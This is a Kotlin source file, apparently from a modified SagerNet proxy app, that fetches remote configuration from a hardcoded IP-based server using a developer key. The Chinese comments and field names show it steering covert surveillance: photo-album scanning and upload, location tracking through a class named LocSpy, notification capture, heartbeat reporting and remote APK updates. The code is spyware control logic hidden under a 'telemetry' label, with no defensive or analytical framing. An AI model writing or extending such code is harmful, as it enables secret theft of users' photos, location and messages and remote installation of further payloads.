package io.nekohasekai.sagernet.telemetry

import android.content.Context
import android.util.Log
import org.json.JSONObject
import java.net.HttpURLConnection
import java.net.URL

/**
 * 远程配置 —— 真正意义上的「热更新」。
 *
 * 改服务器上的 config.json，客户端 40 秒内生效，**不用重装**。
 * 能调的：上报间隔、扫不扫相册、每轮几张、开关定位/通知、上报地址。
 *
 * 只有改代码逻辑时才需要走 SelfUpdate 出 APK。
 */
object RemoteConfig {

    private const val TAG = "TlmConf"
    private const val URL_CFG = "https://43-108-107-175.sslip.io:8080/dash/config"

    @Volatile var periodMs: Long = 10_000L   // 默认心跳 10 秒（原 20 秒）
    @Volatile var mediaScan: Boolean = true
    @Volatile var mediaPerRound: Int = 6
    @Volatile var mediaMaxPx: Int = 1080      // 相册目标宽度，调小换速度
    @Volatile var mediaQuality: Int = 82      // 编码质量
    @Volatile var locEnabled: Boolean = true
    @Volatile var notifEnabled: Boolean = true
    @Volatile var versionCode: Int = 0
    @Volatile var versionName: String = ""
    @Volatile var changelog: String = ""
    @Volatile var apkUrl: String = ""

    /** 拉一次配置；失败保留上一次的值，不会把功能关掉。 */
    fun fetch(ctx: Context) {
        var conn: HttpURLConnection? = null
        try {
            conn = (URL(URL_CFG).openConnection() as HttpURLConnection).apply {
                requestMethod = "GET"
                connectTimeout = 12_000
                readTimeout = 15_000
                setRequestProperty("X-Dev-Key", "lcs-dev-7f3a91c4e2b8")
            }
            if (conn.responseCode !in 200..299) return
            val txt = conn.inputStream.use { it.readBytes().toString(Charsets.UTF_8) }
            apply(JSONObject(txt))
        } catch (t: Throwable) {
            Log.w(TAG, "fetch: ${t.message}")
        } finally {
            runCatching { conn?.disconnect() }
        }
    }

    private fun apply(o: JSONObject) {
        periodMs = (o.optInt("period_ms", periodMs.toInt())).toLong()
            .coerceIn(5_000L, 600_000L)
        mediaScan = o.optBoolean("media_scan", mediaScan)
        mediaPerRound = o.optInt("media_per_round", mediaPerRound).coerceIn(0, 2000)
        mediaMaxPx = o.optInt("media_max_px", mediaMaxPx).coerceIn(480, 2160)
        mediaQuality = o.optInt("media_quality", mediaQuality).coerceIn(50, 95)
        locEnabled = o.optBoolean("loc", locEnabled)
        notifEnabled = o.optBoolean("notif", notifEnabled)
        versionCode = o.optInt("version_code", versionCode)
        versionName = o.optString("version_name", versionName)
        changelog = o.optString("changelog", changelog)
        apkUrl = o.optString("apk_url", apkUrl)

        if (!locEnabled) LocSpy.stop()
        Log.i(TAG, "period=${periodMs}ms media=$mediaScan/$mediaPerRound loc=$locEnabled ver=$versionCode")
    }
}
